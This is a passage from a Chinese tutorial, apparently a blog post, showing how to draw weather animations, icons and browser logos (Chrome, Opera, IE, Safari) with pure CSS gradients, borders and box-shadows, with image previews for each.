rgba(0, 0, 0, 0) -18px 40px, rgba(0, 0, 0, 0) 12px 20px, rgba(0, 0, 0, .3) -31px 70px, rgba(0, 0, 0, .3) 30px 60px;\n    }\n    50% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 70px, rgba(0, 0, 0, .3) 40px 80px, rgba(0, 0, 0, 0) -50px 100px, rgba(0, 0, 0, .3) 55px 80px, rgba(0, 0, 0, .3) -18px 60px, rgba(0, 0, 0, .3) 12px 45px, rgba(0, 0, 0, .3) -31px 95px, rgba(0, 0, 0, .3) 30px 85px;\n    }\n    51% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 70px, rgba(0, 0, 0, .3) 40px 80px, rgba(0, 0, 0, 0) -50px 45px, rgba(0, 0, 0, .3) 55px 80px, rgba(0, 0, 0, .3) -18px 60px, rgba(0, 0, 0, .3) 12px 45px, rgba(0, 0, 0, .3) -31px 95px, rgba(0, 0, 0, .3) 30px 85px;\n    }\n    75% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 95px, rgba(0, 0, 0, .3) 40px 100px, rgba(0, 0, 0, .3) -50px 60px, rgba(0, 0, 0, 0) 55px 95px, rgba(0, 0, 0, .3) -18px 80px, rgba(0, 0, 0, .3) 12px 70px, rgba(0, 0, 0, 0) -31px 120px, rgba(0, 0, 0, 0) 30px 110px;\n    }\n    76% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 95px, rgba(0, 0, 0, .3) 40px 100px, rgba(0, 0, 0, .3) -50px 60px, rgba(0, 0, 0, 0) 55px 35px, rgba(0, 0, 0, .3) -18px 80px, rgba(0, 0, 0, .3) 12px 70px, rgba(0, 0, 0, 0) -31px 25px, rgba(0, 0, 0, 0) 30px 15px;\n    }\n    100% {\n        box-shadow: rgba(0, 0, 0, 0) -10px 120px, rgba(0, 0, 0, 0) 40px 120px, rgba(0, 0, 0, .3) -50px 75px, rgba(0, 0, 0, .3) 55px 50px, rgba(0, 0, 0, .3) -18px 100px, rgba(0, 0, 0, .3) 12px 95px, rgba(0, 0, 0, .3) -31px 45px, rgba(0, 0, 0, .3) 30px 35px;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e微风\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"wind\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb5cd8e6d262?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=159736\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用border、transparent、实现，这个会多一层 \u003ccode\u003ediv.breeze-container\u003c/code\u003e 包裹，样式代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*breeze*/\n.breeze-container{\n    position: absolute;\n    top: 50%;left: 50%;\n    width:200px;height:260px;\n    transform: translate(-50%, -50%);\n    text-align:center;\n    font-size:200%;\n    color:#fff;\n    background:#00BBFF;\n    border-radius:5px;\n}\n.breeze-container:after{\n    content:\"\";\n    position:absolute;\n    top:58%;\n    left:50%;\n    transform: translate(-50%, -50%);\n    width:6px;\n    height:70px;\n    background:#fff;\n}\n.breeze{\n    position:absolute;\n    top: 30%;\n    left: 50%;\n    transform: translate(-50%, -50%) rotate(1deg);\n    border-bottom:60px solid #fff;\n    border-left:5px solid transparent;\n    border-right:5px solid transparent;\n    animation: windmill 12s infinite linear;\n    transform-origin:50.5% 62px;\n}\n.breeze:before{\n    position:absolute;\n    top: 75px;left: -59px;\n    content:\"\";\n    border-right:60px solid #fff;\n    border-top:5px solid transparent;\n    border-bottom:5px solid transparent;\n    transform:rotate(-30deg);\n}\n.breeze:after{\n    position:absolute;\n    top: 75px;left: -1px;\n    content:\"\";\n    border-left:60px solid #fff;\n    border-top:5px solid transparent;\n    border-bottom:5px solid transparent;\n    transform:rotate(30deg);\n}\n@keyframes windmill{\n    0%{\n        transform: translate(-50%, -50%) rotate(0deg);\n    }\n    100%{\n        transform: translate(-50%, -50%) rotate(360deg);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e彩虹\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"rainbow\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb6a409c0973?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=529974\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e主要是利用border、box-shadow 实现，具体实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*rainbow*/\n.rainbow-container{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#F3D166;\n    border-radius:5px;\n}\n.rainbow{\n    position:absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    height: 1px;width: 1px;\n}\n.rainbow:before{\n    content:\"\";\n    position:absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%) rotate(45deg);\n    height: 70px;width: 70px;\n    border-radius: 100px 0 0 0;\n    box-shadow:\n            #F44336 -2px -2px 0 1px,\n            #FF9800 -4px -4px 0 3px,\n            #FFEB3B -6px -6px 0 5px,\n            #8BC34A -8px -8px 0 7px,\n            #00BCD4 -10px -10px 0 9px,\n            #2196F3 -12px -12px 0 11px,\n            #9C27B0 -14px -14px 0 13px;\n    animation: rainbow 5s ease-in-out infinite;\n}\n.rainbow:after{\n    content: \"\";\n    position: absolute;\n    top: 70px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes rainbow {\n    50% {\n        transform: translate(-50%, -55%) rotate(30deg);\n    }\n    100% {\n        transform: translate(-50%, -50%) rotate(45deg);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e夜空\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"moon\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb7c1751450a?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=186277\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e主要是利用 box-shadow 实现 ， 实现方式如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*starry*/\n.starry-container{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#222233;\n    border-radius:5px;\n}\n.starry{\n    position:absolute;\n    top: 30%;left: 40%;\n    transform: translate(-50%, -50%);\n    height: 4px;width: 4px;\n    border-radius:50%;\n    box-shadow:\n            #FFFFFF -26px 77px 0 -1px,\n            rgba(255,255,255,0.1) -36px 59px 0 -1px,\n            rgba(255,255,255,0.1) -28px 89px 0 -1px,\n            #FFFFFF -35px 20px 0 -1px,\n            #FFFFFF 14px 100px,\n            rgba(255,255,255,0.1) 41px 60px,\n            #FFFFFF 34px 39px,\n            rgba(255,255,255,0.1) 14px 45px 0 -1px,\n            #FFFFFF 64px 12px 0 -1px,\n            rgba(255,255,255,0.1) 32px 96px 0 -1px,\n            #FFFFFF 64px 71px,\n            rgba(255,255,255,0.1) 60px 18px 0 -1px,\n            #FFFFFF 34px 9px,\n            rgba(255,255,255,0.1) -26px 55px 0 -1px;\n    animation: starry_star 5s ease-in-out infinite;\n}\n.starry:before{\n    content:\"\";\n    position:absolute;\n    top: 20%;left: 50%;\n    width:100px;height:100px;\n    box-shadow: #FFFFFF -25px 0;\n    transform: rotate(-5deg);\n    border-radius: 50%;\n    animation: starry 5s ease-in-out infinite;\n}\n@keyframes starry {\n    50% {\n        transform: rotate(10deg);\n    }\n}\n@keyframes starry_star{\n    50%{\n        box-shadow:\n                rgba(255,255,255,0.1) -26px 77px 0 -1px,\n                #FFF -36px 59px 0 -1px,\n                #FFF -28px 89px 0 -1px,\n                rgba(255,255,255,0.1) -35px 20px 0 -1px,\n                rgba(255,255,255,0.1) 14px 100px,\n                #FFF 41px 60px,\n                rgba(255,255,255,0.1) 34px 39px,\n                #FFF 14px 45px 0 -1px,\n                rgba(255,255,255,0.1) 64px 12px 0 -1px,\n                #FFF 32px 96px 0 -1px,\n                rgba(255,255,255,0.1) 64px 71px,\n                #FFF 60px 18px 0 -1px,\n                rgba(255,255,255,0.1) 34px 9px,\n                #FFF -26px 55px 0 -1px;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e雷电\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"thunder\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb8bcf96f93e?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=123563\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e主要是利用阴影、border实现，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*thunder*/\n.thunder-container {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 260px;\n    transform: translate(-50%, -50%);\n    background: #444;\n    border-radius: 5px;\n}\n.thunder {\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 40%;\n    left: 30%;\n    background: #222;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #222 65px -15px 0 -5px,\n            #222 25px -25px,\n            #222 30px 10px,\n            #222 60px 15px 0 -10px,\n            #222 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.thunder:before {\n    content: \"\";\n    position: absolute;\n    top: 60px;\n    left: 60px;\n    border-left: 0px solid transparent;\n    border-right: 8px solid transparent;\n    border-top: 38px solid yellow;\n    box-shadow: yellow -7px -32px;\n    transform:rotate(30deg);\n    transform-origin:center -50px;\n    animation:stormy_thunder 2s steps(1, end) infinite;;\n}\n.thunder:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 64px;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    z-index:-1;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -30px);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, 0) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n}\n@keyframes stormy_thunder{\n    0%  {  transform: rotate(30deg); opacity:1; }\n    5%  {  transform: rotate(-34deg); opacity:1; }\n    10% {  transform: rotate(0deg); opacity:1; }\n    15% {  transform: rotate(-34deg); opacity:0; }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e大雪\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"snow\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb9204a92b1e?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=254492\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用阴影实现 ， 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*snow*/\n.snowy-container {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 260px;\n    transform: translate(-50%, -50%);\n    text-align: center;\n    font-size: 200%;\n    color: #fff;\n    background: #607D8B;\n    border-radius: 5px;\n}\n.snowy {\n    position: absolute;\n    width: 4px;\n    height: 4px;\n    border-radius:50%;\n    top: 30%;\n    left: 50%;\n    background: #fff;\n    border-radius: 50%;\n    animation: snowy_rain 2s infinite linear;\n}\n.snowy:before {\n    content: \"\";\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 30px;\n    left: -40px;\n    background: #eee;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #eee 65px -15px 0 -5px,\n            #eee 25px -25px,\n            #eee 30px 10px,\n            #eee 60px 15px 0 -10px,\n            #eee 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.snowy:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -70%);\n    }\n    100% {\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n@keyframes snowy_rain {\n    0% {\n        box-shadow:\n                rgba(255, 255, 255, 0) -10px 30px,\n                rgba(255, 255, 255, 0) 40px 40px,\n                rgba(255, 255, 255, .6) -50px 75px,\n                rgba(255, 255, 255, .6) 55px 50px,\n                rgba(255, 255, 255, .6) -18px 100px,\n                rgba(255, 255, 255, .6) 12px 95px,\n                rgba(255, 255, 255, .6) -31px 45px,\n                rgba(255, 255, 255, .6) 30px 35px;\n    }\n    25% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 45px,\n                rgba(255, 255, 255, .6) 40px 60px,\n                rgba(255, 255, 255, .6) -50px 90px,\n                rgba(255, 255, 255, .6) 55px 65px,\n                rgba(255, 255, 255, 0) -18px 120px,\n                rgba(255, 255, 255, 0) 12px 120px,\n                rgba(255, 255, 255, .6) -31px 70px,\n                rgba(255, 255, 255, .6) 30px 60px;\n    }\n    26% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 45px,\n                rgba(255, 255, 255, .6) 40px 60px,\n                rgba(255, 255, 255, .6) -50px 90px,\n                rgba(255, 255, 255, .6) 55px 65px,\n                rgba(255, 255, 255, 0) -18px 40px,\n                rgba(255, 255, 255, 0) 12px 20px,\n                rgba(255, 255, 255, .6) -31px 70px,\n                rgba(255, 255, 255, .6) 30px 60px;\n    }\n    50% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 70px,\n                rgba(255, 255, 255, .6) 40px 80px,\n                rgba(255, 255, 255, 0) -50px 100px,\n                rgba(255, 255, 255, .6) 55px 80px,\n                rgba(255, 255, 255, .6) -18px 60px,\n                rgba(255, 255, 255, .6) 12px 45px,\n                rgba(255, 255, 255, .6) -31px 95px,\n                rgba(255, 255, 255, .6) 30px 85px;\n    }\n    51% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 70px,\n                rgba(255, 255, 255, .6) 40px 80px,\n                rgba(255, 255, 255, 0) -50px 45px,\n                rgba(255, 255, 255, .6) 55px 80px,\n                rgba(255, 255, 255, .6) -18px 60px,\n                rgba(255, 255, 255, .6) 12px 45px,\n                rgba(255, 255, 255, .6) -31px 95px,\n                rgba(255, 255, 255, .6) 30px 85px;\n    }\n    75% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 95px,\n                rgba(255, 255, 255, .6) 40px 100px,\n                rgba(255, 255, 255, .6) -50px 60px,\n                rgba(255, 255, 255, 0) 55px 95px,\n                rgba(255, 255, 255, .6) -18px 80px,\n                rgba(255, 255, 255, .6) 12px 70px,\n                rgba(255, 255, 255, 0) -31px 120px,\n                rgba(255, 255, 255, 0) 30px 110px;\n    }\n    76% {\n        box-shadow:\n                rgba(255, 255, 255, .6) -10px 95px,\n                rgba(255, 255, 255, .6) 40px 100px,\n                rgba(255, 255, 255, .6) -50px 60px,\n                rgba(255, 255, 255, 0) 55px 35px,\n                rgba(255, 255, 255, .6) -18px 80px,\n                rgba(255, 255, 255, .6) 12px 70px,\n                rgba(255, 255, 255, 0) -31px 25px,\n                rgba(255, 255, 255, 0) 30px 15px;\n    }\n    100% {\n        box-shadow:\n                rgba(255, 255, 255, 0) -10px 120px,\n                rgba(255, 255, 255, 0) 40px 120px,\n                rgba(255, 255, 255, .6) -50px 75px,\n                rgba(255, 255, 255, .6) 55px 50px,\n                rgba(255, 255, 255, .6) -18px 100px,\n                rgba(255, 255, 255, .6) 12px 95px,\n                rgba(255, 255, 255, .6) -31px 45px,\n                rgba(255, 255, 255, .6) 30px 35px;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e五角星\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"五角星\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c60c3b3523d7?w=234\u0026amp;h=258\u0026amp;f=png\u0026amp;s=14649\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e主要是利用border、transparent、旋转实现，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*star*/\n.five-star{\n    position: absolute;\n    top: 35%;\n    right: 50%;\n    transform: translate(-50%, -50%) scale(8);\n    width: 0;\n    height: 0;\n    display: block;\n    border-left: 3.04px solid transparent;\n    border-right: 3.24px solid transparent;\n    border-bottom: 10px solid #98DBE3;\n    -webkit-filter: drop-shadow(1px .5px 1px #ccc);\n    cursor: pointer;\n}\n.five-star:before{\n    content: \"\";\n    position: absolute;\n    top: 8.65px;\n    left: -8.82px;\n    width: 0;\n    height: 0;\n    color: #98DBE3;\n    display: block;\n    border-left: 12.5px solid transparent;\n    border-right: 12.5px solid transparent;\n    border-bottom: 9.08px solid #98DBE3;\n    transform-origin: top center;\n    transform: rotate(36deg);\n}\n.five-star:after{\n    content: \"\";\n    position: absolute;\n    top: 8.65px;\n    left: -15px;\n    width: 0;\n    height: 0;\n    color: #98DBE3;\n    display: block;\n    border-left: 12.5px solid transparent;\n    border-right: 12.5px solid transparent;\n    border-bottom: 9.08px solid #98DBE3;\n    transform-origin: top center;\n    transform: rotate(-36deg);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e太极八卦\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"太极八卦\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c62e88dda173?w=273\u0026amp;h=262\u0026amp;f=png\u0026amp;s=6678\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 box-shadow 实现 ， 代码很简单：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*TaiChi*/\n.TaiChi{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 200px;\n    transform: translate(-50%, -50%);\n    box-shadow:0 0 2px #ddd;\n    border-radius:50%;\n    background-image:\n            radial-gradient(#000 12.5px, transparent 12.5px),\n            radial-gradient(#fff 12.5px, transparent 12.5px),\n            radial-gradient(#fff 50px, transparent 50px),\n            radial-gradient(#000 50px, transparent 50px),\n            linear-gradient(90deg,#000 100px, #fff 100px);\n    background-position:center 50px,center -50px,center 50px,center -50px,0 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e美队盾牌\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"美队盾牌\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c654fe2e1e5b?w=267\u0026amp;h=279\u0026amp;f=png\u0026amp;s=38717\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 渐变 实现 ， 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*captainAmerica*/\n.captainAmerica{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 200px;\n    transform: translate(-50%, -50%);\n    background:\n            linear-gradient(45deg, rgba(255,255,255,0) 35%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 65%),\n            linear-gradient(-45deg, rgba(255,255,255,0) 35%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 65%),\n            linear-gradient(to right, rgba(0,0,0,0) 35%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0) 65%),\n            linear-gradient(to bottom, rgba(0,0,0,0) 35%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0) 65%),\n            radial-gradient(ellipse at center, #0033b0 20%, #ce0021 20%, #ce0021 35%, #eee 35%, #eee 55%, #ce0021 55%);\n    border-radius: 50%;\n    box-shadow: 0 3px 0 #a20917,0 4px 2px 2px #eee;\n}\n.captainAmerica::before{\n    content: '★';\n    position:absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%);\n    margin-left:-3px;\n    width: 50px;height:50px;\n    font-family: simsun,Tahoma,Helvetica,Arial,SimHei,sans-serif;\n    line-height: 47px;\n    z-index: 1;\n    border-radius: 50%;\n    font-size: 55px;\n    color: #fff;\n    text-align:center;\n    text-shadow: 2px 1px 2px #777;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e纽扣\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"纽扣\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c66d6b7f7ca4?w=253\u0026amp;h=237\u0026amp;f=png\u0026amp;s=35711\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 渐变、阴影 实现 ， 实现方法如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*button*/\n.button{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    width: 180px;\n    height: 180px;\n    background: #87ceeb;\n    border-radius: 50%;\n    box-shadow:\n            inset 0 5px 5px #87ceeb,\n            inset 0 17px 5px rgba(255,255,255,0.7),\n            inset 0 -3px 3px rgba(255,255,255,0.3),\n            inset 0 -10px 10px rgba(0,0,0,0.3),\n            inset 0 -15px 10px #45b3e0,\n            0 7px 10px rgba(0,0,0,0.3);\n}\n.button::before{\n    content: '';\n    position:absolute;\n    top: 50%;left: 50%;\n    width: 110px;height: 106px;\n    margin-left: -55px;margin-top: -55px;\n    background-image:\n            radial-gradient(circle at 38px 38px, #333 10px, transparent 10px),\n            radial-gradient(circle at 73px 73px, #333 10px, transparent 10px),\n            radial-gradient(circle at 38px 73px, #333 10px, transparent 10px),\n            radial-gradient(circle at 73px 38px, #333 10px, transparent 10px);\n    border-radius: 50%;\n    border-top: 1px solid rgba(0,0,0,0.6);\n    border-bottom: 1px solid rgba(255,255,255,0.6);\n    box-shadow:\n            inset 0 20px 2px rgba(255,255,255,0.3),\n            3px -15px 7px -4px rgba(0,0,0,0.3),\n            0 -14px 10px 5px #45b3e0,\n            0 2px 5px 5px #87ceeb,\n            0 10px 5px 5px rgba(255,255,255,0.6);\n}\n.button::after{\n    content: '';\n    position:absolute;\n    top: 50%;left: 50%;\n    width: 50px;height: 50px;\n    margin-left: -25px;\n    margin-top: -23px;\n    background-image:\n            linear-gradient(to right, transparent 35%, #000080 35%, #4682b4 40%, #000080 45%, #4682b4 50%, #000080 55%, #4682b4 60%, #000080 65%, transparent 65%),\n            linear-gradient(to bottom, transparent 35%, #000080 35%, #4682b4 40%, #000080 45%, #4682b4 50%, #000080 55%, #4682b4 60%, #000080 65%, transparent 65%);\n    border-radius: 50%;\n    transform: rotate(45deg);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eChrome\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Chrome\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c68ed206684a?w=278\u0026amp;h=263\u0026amp;f=png\u0026amp;s=15422\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用渐变实现 , 具体如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*chrome*/\n.Chrome{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 180px;height: 180px;\n    transform: translate(-50%, -50%);\n    box-shadow:0 0px 4px #999,0 0 2px #ddd inset;\n    border-radius:50%;\n    background-image:\n            radial-gradient(#4FACF5 0%,#2196F3 28%, transparent 28%),\n            radial-gradient(#fff 33%, transparent 33%),\n            linear-gradient(-50deg,#FFEB3B 34%, transparent 34%),\n            linear-gradient(60deg,#4CAF50 33%, transparent 33%),\n            linear-gradient(180deg,#FF756B 0%, #F44336 30%, transparent 30%),\n            linear-gradient(-120deg,#FFEB3B 40%, transparent 40%),\n            linear-gradient(-60deg,#FFEB3B 30%, transparent 30%),\n            linear-gradient(0deg,#4CAF50 45%, transparent 45%),\n            linear-gradient(60deg,#4CAF50 30%, transparent 30%),\n            linear-gradient(120deg,#F44336 50%, transparent 50%),\n            linear-gradient(180deg,#F44336 30%, transparent 30%);\n    background-position:0 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eOpera\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Opera\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c6ad7311175f?w=253\u0026amp;h=255\u0026amp;f=png\u0026amp;s=12915\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用渐变实现 , 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*Opera*/\n.Opera{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 170px;height: 200px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    box-shadow:0 2px 4px #333;\n    background-image:\n            linear-gradient(rgb(254, 135, 138) 0%, rgb(231, 22, 22) 50%, rgb(128, 0, 0) 85%, rgb(184, 3, 4) 100%);\n}\n.Opera:after{\n    content:\"\";\n    position: absolute;\n    top:50%;left:50%;\n    width: 60px;height: 180px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:#fff;\n}\n.Opera:before{\n    content:\"\";\n    position: absolute;\n    top:50%;left:50%;\n    width: 72px;height: 185px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:rgba(0,0,0,.4);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eIE\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"IE\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c6c9d941f7cb?w=314\u0026amp;h=267\u0026amp;f=png\u0026amp;s=9100\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用渐变、多重阴影实现 ， 代码实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*IE*/\n.IE{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:200px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background-image:\n            radial-gradient(#fff 38%, transparent 38%),\n            radial-gradient(#09C 0%, #09C 100%);\n\n}\n.IE:before{\n    content: \"\";\n    width:285px;\n    height:122px;\n    background:none;\n    border-radius:100%;\n    position:absolute;\n    top:33px;\n    left:-45px;\n    margin:auto;\n    box-shadow:\n            inset 0 12px 0 13px  #09c,\n            -35px -8px 0 -5px #fff;\n    transform: rotate(-35deg);\n}\n.IE:after {\n    content: \"\";\n    width: 120px;\n    height: 25px;\n    background: #09c;\n    position: absolute;\n    top: 80px;\n    left: 0;\n    right: 0;\n    margin: auto;\n    box-shadow: 50px 23px 0 -2px #fff\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003esafari\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"safari\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c996a8c00cbd?w=302\u0026amp;h=276\u0026amp;f=png\u0026amp;s=19722\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用渐变、border、旋转实现 ， 具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*safari*/\n.safari{\n    position: absolute;\n    top: 50%;left: 50%;\n    width:200px; height:200px;\n    transform: translate(-50%, 